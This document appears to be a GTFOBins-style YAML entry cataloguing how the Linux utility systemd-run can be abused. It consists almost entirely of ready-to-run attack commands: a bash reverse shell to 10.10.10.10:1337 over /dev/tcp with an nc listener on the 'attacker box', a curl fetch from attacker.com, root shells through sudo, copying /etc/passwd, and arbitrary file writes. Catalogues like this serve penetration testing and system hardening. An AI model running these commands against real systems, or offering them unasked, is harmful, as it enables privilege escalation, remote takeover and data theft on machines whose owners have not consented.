---
functions:
  shell:
    - description: Run an interactive shell using the user's default shell. The `-S` or `--shell` option can be used to invoke the default shell interactively.
      code: systemd-run -S
    - description: Run a shell using a pseudo-terminal (PTY). The `-t` or `--pty` option can be used to run the service on a pseudo-TTY as STDIN/STDOUT/STDERR.
      code: systemd-run --pty /bin/sh
  command:
    - description: Execute a specific command and redirect the output to a file. In this case, the command runs `id` and saves the result to `/tmp/id`.
      code: systemd-run /bin/bash -c "/bin/id > /tmp/id"
  reverse-shell:
    - description: Run a reverse shell to a remote machine. The reverse shell connects to the specified IP and port. Since `systemd-run` does not handle exported environment variables, the IP address and port must be specified directly in the command. Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: systemd-run /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'
  file-upload:
    - description: Serve files from the local directory over HTTP. This requires Python to be installed. The command starts a Python HTTP server on port 8888.
      code: systemd-run python3 -m http.server 8888
  file-download:
    - description: Download a file from a remote server via HTTP. The file is saved to `/tmp/file_to_save` using `curl`.
      code: systemd-run /bin/sh -c 'curl -o /tmp/file_to_save http://attacker.com/file_to_get'
  sudo:
    - description: Gain an interactive shell as root using `sudo` and `systemd-run`. The `-S` option invokes the shell.
      code: sudo systemd-run -S
    - description: Gain a root shell using `sudo` and `systemd-run` with a pseudo-terminal (PTY).
      code: sudo systemd-run --pty /bin/sh
  file-read:
    - description: Read the contents of a file and redirect the output to another file. In this example, the contents of `/etc/passwd` are copied to `/tmp/passwd`.
      code: systemd-run /bin/sh -c "/bin/cat /etc/passwd > /tmp/passwd"
  file-write:
    - description: Write data to a specific file. The filename should be absolute. In this example, the string "DATA" is written to `/tmp/file`.
      code: systemd-run /bin/sh -c 'echo "DATA" > /tmp/file'
---